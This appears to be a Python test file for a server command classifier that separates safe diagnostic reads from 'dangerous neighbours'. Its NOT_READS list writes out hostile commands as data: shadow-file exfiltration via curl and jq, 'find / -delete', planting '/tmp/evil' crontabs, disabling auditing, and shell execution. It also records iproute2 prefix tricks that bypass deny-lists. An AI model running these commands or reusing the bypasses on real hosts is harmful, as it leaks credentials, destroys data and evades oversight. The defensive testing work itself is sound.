"""The investigation read lists (docs/NO-PASTE.md F3a).

Every addition gets a positive case AND the dangerous neighbour it must not
admit. A read runs with no --run, no approval, on frozen hosts — so a grammar
that lets a write through is a hole, not a convenience.
"""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from vpscfg import gates, vpsexec  # noqa: E402
from vpscfg.vpsexec import Refused  # noqa: E402

READS = [
    # performance / outage triage
    "vmstat 1 5", "vmstat -w 1 3", "iostat -xz 1 3", "mpstat -P ALL 1 3",
    "pidstat -u 1 3", "top -b -n 1", "top -bn 1",
    "timedatectl", "timedatectl status", "chronyc tracking", "chronyc -n sources",
    "ntpq -p", "findmnt", "findmnt -D", "mount", "swapon --show",
    "mdadm --detail /dev/md0", "smartctl -H /dev/sda", "smartctl -l selftest /dev/sda",
    # containers / k8s
    "docker compose ls", "docker events --since 10m --until 0s",
    "docker network inspect bridge", "docker volume inspect pgdata",
    "k3s crictl ps", "crictl pods", "k3s crictl logs --tail 50 abc123",
    "helm list -A", "helm status traefik -n kube-system", "helm history traefik -n kube-system",
    # network
    "ip addr", "ip -br addr", "ip -4 addr show dev eth0", "ip route",
    "ip route get 192.0.2.1", "ip rule", "ip -s link", "ip neigh",
    "lsof -nP -i :443", "lsof -nP -i", "conntrack -C", "conntrack -S",
    "fail2ban-client status", "fail2ban-client status sshd",
    "curl -q -sS -o /dev/null -w '%{http_code}' https://example.com",
    "curl -q -sSk --resolve example.com:443:127.0.0.1 https://example.com/health",
    "curl -q -sS -H 'Host: example.com' http://127.0.0.1/",
    "traceroute -n 192.0.2.1", "mtr -r -n -c 5 192.0.2.1", "nc -z -v -w 3 db 5432",
    # web / tls / dns / mail
    "certbot certificates", "certbot certificates --cert-name example.com",
    "apachectl -S", "caddy version", "caddy validate --config /etc/caddy/Caddyfile",
    "caddy validate --config /opt/n8n/Caddyfile --adapter caddyfile",
    "named-checkconf", "named-checkconf -z", "named-checkzone example.com /etc/bind/db.example",
    "rndc status", "postqueue -p", "postqueue -c /etc/postfix-out -p", "mailq",
    "postconf -n", "postconf -d smtpd_tls_security_level", "postconf mynetworks",
    "postmulti -l", "postmulti -i postfix-out -x postqueue -p",
    "postmulti -i postfix-out -x postconf -n", "postcat -hq ABC123",
    "opendkim-testkey -d example.com -s mail -vvv",
    # security investigation
    "last -n 20", "last -F -i -n 50", "lastb -n 20", "lastlog", "who", "w",
    "getent passwd", "getent group docker", "getent hosts db",
    "crontab -l", "crontab -l -u www-data", "crontab -u www-data -l",
    "find / -xdev -perm -4000 -type f", "find /etc -newer /etc/hostname -type f",
    "find /home -nouser", "dpkg -l", "dpkg -l nginx", "dpkg -V", "dpkg -V openssh-server",
    "dpkg -S /usr/sbin/sshd", "debsums -s", "apt list --installed", "apt list --upgradable",
    "apt-cache policy openssl", "readlink -f /proc/1/exe", "realpath /opt/app",
    "file /usr/bin/ls", "strings -n 8 /usr/local/bin/x", "lsattr /etc/passwd",
    "getfacl /opt/app", "auditctl -l", "auditctl -s",
    "ausearch -ts recent -m USER_LOGIN -i", "ausearch -ts 09/27/2026 10:00:00 -k ssh",
    "aa-status", "sysctl -n vm.swappiness", "sysctl -a",
    "jq . /etc/docker/daemon.json", "jq -r .auths /tmp/x.json",
    "diff -u /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak", "cmp a b",
    "zcat /var/log/syslog.2.gz", "zgrep -i error /var/log/syslog.2.gz",
    "ps aux | tr -s ' '", "mount | column -t",
    "journalctl -u ssh --since today --no-pager | grep -i failed",
]

NOT_READS = [
    # the neighbour of each addition that writes, hangs, runs code, or leaks
    "top", "top -n 1",                              # interactive, never exits
    "vmstat -S M foo",                              # non-numeric operand
    "timedatectl set-time 10:00", "timedatectl set-ntp false",
    "chronyc makestep", "chronyc -a burst 4/4",
    "swapon /dev/sdb2", "swapon -a", "mdadm --stop /dev/md0", "mdadm --detail --scan",
    "smartctl -t long /dev/sda", "smartctl -s off /dev/sda",
    "docker events", "docker events --since 1h",    # unbounded: never returns
    "docker network create x", "docker volume create x",
    "helm get values traefik", "helm upgrade x y", "crictl inspect abc", "crictl rm abc",
    "k3s crictl exec abc sh",
    "ip addr add 10.0.0.1/24 dev eth0", "ip route del default", "ip link set eth0 down",
    "ip -batch /tmp/cmds", "ip -b /tmp/cmds", "ip netns exec x sh", "ip -n dns1 addr",
    "ip route flush cache", "ip neigh flush all",
    "lsof +D /", "conntrack -D", "conntrack -F", "conntrack -L -p tcp",
    "fail2ban-client set sshd unbanip 192.0.2.4", "fail2ban-client reload",
    "curl -q -o /tmp/x https://example.com", "curl -q -so /tmp/x https://example.com", "curl -qso /tmp/x https://example.com",
    "curl -q -sS -w @/etc/shadow https://example.com", "curl -q -sS -H @/root/h https://example.com",
    "curl -q -sS -X POST https://example.com", "curl -q -sS -d a=b https://example.com",
    "curl -q -sS -T /etc/passwd https://example.com", "curl https://example.com",
    "nc -l 4444", "nc db 5432", "mtr 192.0.2.1",
    "certbot renew", "certbot delete --cert-name x", "certbot certificates --force",
    "apachectl graceful", "apachectl -k restart", "caddy reload", "caddy run",
    "named-checkconf -p", "named-checkzone -o /tmp/out example.com db",
    "rndc reload", "rndc flush", "rndc freeze",
    "postqueue -f", "postqueue -s example.com", "postqueue -c /etc/postfix",
    "postconf -e mynetworks=0.0.0.0/0", "postconf mynetworks=0.0.0.0/0",
    "postconf -X mynetworks", "postconf -M smtp/inet=x",
    "postmulti -i postfix-out -x sh", "postmulti -i postfix-out -x postqueue -f",
    "postmulti -e init", "postcat -q ABC123", "postcat -bq ABC123",
    "getent shadow", "getent gshadow", "getent -s files shadow",
    "crontab /tmp/evil", "crontab -r", "crontab -e", "crontab -u root /tmp/evil",
    "find / -perm -4000 -exec sh {} ;", "find / -delete", "find / -fprint /tmp/x",
    "dpkg -i x.deb", "dpkg -r nginx", "dpkg --configure -a", "dpkg -l --admindir=/tmp",
    "debsums --generate=all", "apt list --installed -o Dir::Etc=/tmp",
    "apt-get update", "apt-cache gencaches", "apt-cache policy -o x=y openssl",
    "file -C -m /tmp/magic", "auditctl -D", "auditctl -e 0", "auditctl -w /etc -p wa",
    "ausearch -if /tmp/log", "ausearch --bogus",
    "aa-status --bogus", "sysctl -w vm.swappiness=1", "sysctl vm.swappiness=1",
    "sysctl -p", "sysctl --system",
    "jq", "jq --rawfile x /etc/shadow .", "diff --to-file=x a",
    "sed -n 1p /etc/hosts", "awk 'BEGIN{system(\"id\")}'",
    # --- found by the independent security review of this branch ---------
    # iproute2 accepts any verb prefix: a verb deny-list was unsound
    "ip r d default", "ip l s eth0 down", "ip a a 192.0.2.4/32 dev lo",
    "ip r a default via 192.0.2.1", "ip route rep default via 192.0.2.1",
    "ip addr ch 192.0.2.4 dev lo", "ip n f all", "ip -s neigh f all",
    "ip route fl table main", "ip neigh re", "ip ru a", "ip m a", "ip a get x",
    # smartctl -l can SET drive parameters
    "smartctl -l scterc,70,70 /dev/sda", "smartctl -l scttempint,10,p /dev/sda",
    # a required flag hidden as another option's value is not in effect
    "postcat -c -h QID", "top -E -b", "top -n 1 -E -b", "nc -w -z h 1", "mtr -P -r h",
    # helm status -o prints release values and rendered Secrets
    "helm status x -o json", "helm status x --output yaml",
    # curl: bundled @file values, and -w %output{} (writes a file on curl >= 8.3)
    "curl -q -sH @/etc/shadow http://127.0.0.1/", "curl -q -sw @/x http://127.0.0.1/",
    "curl -q -w '%output{/tmp/x}x' http://127.0.0.1/",
    # jq generators pin CPU / RAM on the host; the ssh timeout does not kill them
    "jq -n 'repeat(1)'", "jq -n '[range(1e12)]'", "jq '[repeat(1)]' /x.json",
    # a future --until never returns
    "docker events --since 1h --until 2099-01-01",
    # chroot / alternate root, and path traversal out of /dev
    "named-checkconf -t /tmp", "named-checkzone -w /tmp z f", "mdadm -D /dev/../tmp/x",
]


def tier(cmd):
    return vpsexec.classify(cmd, gates.DENY_ALWAYS_FLOOR)[0]


class InvestigationReadsTest(unittest.TestCase):
    def test_reads_classify_as_reads(self):
        wrong = [(c, tier(c)) for c in READS if tier(c) != "read"]
        self.assertEqual(wrong, [])

    def test_dangerous_neighbours_are_not_reads(self):
        admitted = []
        for c in NOT_READS:
            try:
                if tier(c) == "read":
                    admitted.append(c)
            except Refused:
                pass  # refused outright is even better than mutating
        self.assertEqual(admitted, [])

    def test_lists_do_not_overlap(self):
        self.assertEqual(set(READS) & set(NOT_READS), set())


if __name__ == "__main__":
    unittest.main()
